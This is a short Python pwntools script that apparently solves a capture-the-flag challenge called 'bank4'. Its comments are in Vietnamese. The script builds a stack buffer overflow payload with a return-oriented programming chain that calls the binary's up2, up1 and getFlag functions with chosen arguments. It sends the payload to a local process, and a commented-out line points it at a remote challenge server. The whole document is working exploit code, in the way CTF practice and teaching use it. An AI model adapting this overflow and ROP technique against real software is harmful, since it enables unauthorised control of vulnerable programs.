from pwn import *

binary = context.binary = ELF('./bank4')
rop = ROP(binary)

pop_ebp_ret = rop.find_gadget(['pop ebp', 'ret'])[0]

p = process('./bank4')
#p = remote('61.28.237.24', '30205')

payload = b'A' * (0x4c + 4) # khoảng cách giữa biến name và return address
payload += p32(binary.sym.up2) # địa chỉ ham up2
payload += p32(pop_ebp_ret) # địa chỉ khối lệnh (pop ebp ; ret) -> này sẽ là return address sau khi gọi xong hàm up2
payload += p32(pop_ebp_ret) # địa chỉ khối lệnh (pop ebp ; ret) -> tham số đầu tiên của hàm up2
payload += p32(pop_ebp_ret)  # địa chỉ khối lệnh (pop ebp ; ret) -> tham số thứ 2 của hàm up2
payload += p32(0x12345678)  # -> tham số thứ 3 của hàm up2
payload += p32(binary.sym.up1) # -> địa chỉ của hàm up1
payload += p32(binary.sym.getFlag) # -> địa chỉ của hàm getFlag
payload += p32(0x1337) # -> tham số thứ nhất của hàm getFlag
payload += p32(0xDEAD) # -> tham số thứ hai của hàm getFlag



f = open('solve.txt', 'wb')

f.write(payload)

p.sendline(payload)

p.interactive()
